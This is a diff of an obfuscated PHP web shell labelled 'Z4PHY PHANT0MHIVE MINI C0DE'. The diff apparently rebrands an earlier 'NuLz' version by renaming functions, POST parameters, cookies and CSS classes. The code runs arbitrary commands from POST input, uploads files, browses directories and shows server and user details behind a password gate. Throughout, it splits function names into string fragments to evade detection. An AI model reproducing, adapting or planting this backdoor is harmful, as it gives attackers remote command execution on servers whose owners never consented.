@@ -64,7 +64,7 @@ function deleteFile($fileName) {
         return false;
     }
 }
-function NuLzCmd($komendnya) {
+function Z4pCmd($komendnya) {
     $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
     $fw = 'f'.'wr'.'it'.'e';
     $fc = 'f'.'cl'.'os'.'e';
@@ -137,9 +137,9 @@ function NuLzCmd($komendnya) {
         return "<b> Yah Disable Function Abangku, Bypass Dulu Ya -z4phy </b>";
     }
 }
-if (isset($_POST['nulz'])) {
-    $komendnya = $_POST['nulz'];
-    echo NuLzCmd($komendnya);
+if (isset($_POST['z4phygg'])) {
+    $komendnya = $_POST['z4phygg'];
+    echo Z4pCmd($komendnya);
 }
 function XaFV($FQS) { 
     $gflate = 'g'.'zi'.'nf'.'l'.'at'.'e';
@@ -157,7 +157,7 @@ function XaFV($FQS) {
 $s_he_ll_Name = "Z4"."PH"."Y "."PH"."ANT"."0"."MH"."IV"."E "."MI"."NI"." C"."0"."DE";
 $s_he_ll_Logo = "ht"."tp"."s:/"."/ra"."w.gi"."thu"."b"."us"."er"."con"."te"."nt."."co"."m/z"."4p"."hyr"."/z"."4p"."hy"."-c0"."de"."/"."mai"."n/"."as"."set"."s/"."z4p"."hy".".p"."ng";
 $s_he_ll_Icon = "h"."tt"."ps:"."//"."r"."aw."."gi"."thu"."bu"."ser"."co"."nte"."nt."."com"."/z4"."ph"."yr"."/"."z4"."phy"."-c0"."de/"."ma"."in/"."ass"."ets"."/c"."ie"."l."."p"."ng";
-function NuLzCwd(){
+function Z4pCwd(){
     $cw = "ge"."tc"."wd";
     $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
     $d_name = 'd'.'ir'.'na'.'m'.'e';
@@ -167,7 +167,7 @@ function NuLzCwd(){
 		return $d_name($_SERVER["SCRIPT_FILENAME"]);
 	}
 }
-function NuLzUname() {
+function Z4pUname() {
     $func_exist = "fu"."nc"."ti"."on"."_"."ex"."is"."ts";
     $u_n_a_me = "p"."hp"."_"."un"."ame";
     $u_n_a_me_disable = '<font class="font-ubuntu-mono font-green"> Cant Read The Kernel! The Function php_uname() is Disabled! </font>';
@@ -390,22 +390,22 @@ $my_self = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOS
 if (isset($_POST['z4phy-boy'])) {
     if (SHA1($_POST['susahdah']) == $anuan) {
         echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Me"."ny"."al"."a "."Ab"."an"."gk"."u "."~!'".");"."</"."sc"."ri"."pt".">";
-        $_SESSION["login"] = "login";
-        setcookie('logined', $my_self, time() + 3600 * 24);
+        $_SESSION["tabrakz4p"] = "tabrakz4p";
+        setcookie('z4phyc0de', $my_self, time() + 3600 * 24);
     } else {
-        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Ma"."ti"." a"."e "."lu"." n"."oo"."b!')".";<"."/s"."cr"."ip"."t>";
+        echo "<s"."cr"."ip"."t>"."al"."er"."t("."'Go"." A"."wa"."y "."No"."ob"."!!')".";<"."/s"."cr"."ip"."t>";
     }
 }
 if (isset($_GET['logout'])) {
     $_SESSION = [];
     session_unset();
     session_destroy();
-    setcookie('logined', '', time() - 3600);
+    setcookie('z4phyc0de', '', time() - 3600);
     echo "<s"."c"."ri"."pt".">"."window.location.assign('" . $_SERVER['PHP_SELF'] . "')"."</"."sc"."ri"."pt".">";
     exit();
 }
-if (empty($_SESSION['login'])) {
-    if (empty($_COOKIE['logined'])) {
+if (empty($_SESSION['tabrakz4p'])) {
+    if (empty($_COOKIE['z4phyc0de'])) {
 ?>
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
@@ -432,7 +432,7 @@ if (isset($_GET['path'])) {
     $path = $_GET['path'];
     chdir($_GET['path']);
 } else {
-    $path = NuLzCwd();
+    $path = Z4pCwd();
 }
 $path = str_replace("\\", "/", $path);
 ?>
@@ -472,12 +472,12 @@ $path = str_replace("\\", "/", $path);
 <body>
     <header class="uk-width-1-1" style="background: var(--gray-900);">
         <div class="uk-margin-small-left">
-            <div class="nulz-ganteng uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
+            <div class="z4phy-sans uk-flex uk-flex-left uk-flex-middle uk-flex-row uk-flex-nowrap">
                 <img style="width: 5vh; border-radius: 5px;" src="<?=$s_he_ll_Logo?>" alt="<?=$s_he_ll_Name?>">
                 <span class="uk-margin-small-left font-trade-winds uk-text-large"><?=$s_he_ll_Name?></span>
             </div>
-            <div class="nulz-sysinfo uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
-            <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=NuLzUname();?></span>
+            <div class="z4p-ph4ntom uk-flex uk-flex-left uk-flex-column uk-flex-wrap">
+            <span class="font-bold"><?='Sy'.'s'.'te'.'m'?>: <?=Z4pUname();?></span>
             <span class="font-bold"><?='ID'.'('.'Us'.'er'.'/'.'G'.'ro'.'u'.'p)'?>: <font class="font-green font-ubuntu-mono">uid=<?=$uid?>(<?=$user?>)&nbsp;gid=<?=$gid?>(<?=$group?>)</font></span>
             <span class="font-bold"><?='Se'.'r'.'v'.'er '.'I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=serverIp()?></font></span>
             <span class="font-bold"><?='Yo'.'u'.'r I'.'P'?>: <font class="font-green font-ubuntu-mono"><?=userIp()?></font></span>
@@ -507,7 +507,7 @@ $path = str_replace("\\", "/", $path);
     </div>
     </header>
 
-    <div class="nulz-tools uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
+    <div class="tools-z4p uk-width-1-1 uk-flex uk-flex-center uk-flex-middle uk-flex-column uk-flex-wrap" style="background: var(--gray-900);">
         <div class="tools-upload">
             <form action="" method="POST" enctype="multipart/form-data" class="form-tools uk-form-horizontal uk-margin uk-padding-small font-protest-riot">
                 <input type="file" name="file[]" onchange="this.form.submit()" multiple>
@@ -856,7 +856,7 @@ $path = str_replace("\\", "/", $path);
                         </div>
                         <div>';
                         if (isset($_POST['btn-cmd'])) {
-                            echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.NuLzCmd($_POST["komendnya"]).'</textarea>';
+                            echo '<textarea style="background: var(--gray-950); border: 1px solid var(--gray-500); color: var(--green-500);" class="output-cmd uk-textarea font-ubuntu-mono" name="newfilecontent" rows="15" aria-label="Textarea" readonly>'.Z4pCmd($_POST["komendnya"]).'</textarea>';
                         }
                 echo '</div>
                     </fieldset>
@@ -1079,7 +1079,7 @@ $path = str_replace("\\", "/", $path);
                     </thead>
                     <tbody>
                         <tr>
-                            <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
+                            <td><?='-'.'Z'.'4'.'P'.'-'?></td>
                             <td class="body-folder uk-text-nowrap"><a href="?path=<?=dirname($path)?>" class="dirpath font-white"><i class="fa-duotone fa-folders font-amber"></i>&nbsp;&nbsp;..</a></td>
                             <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
                             <td><?='-'.'-'.'Z'.'4'.'P'.'H'.'Y'.'-'.'-'?></td>
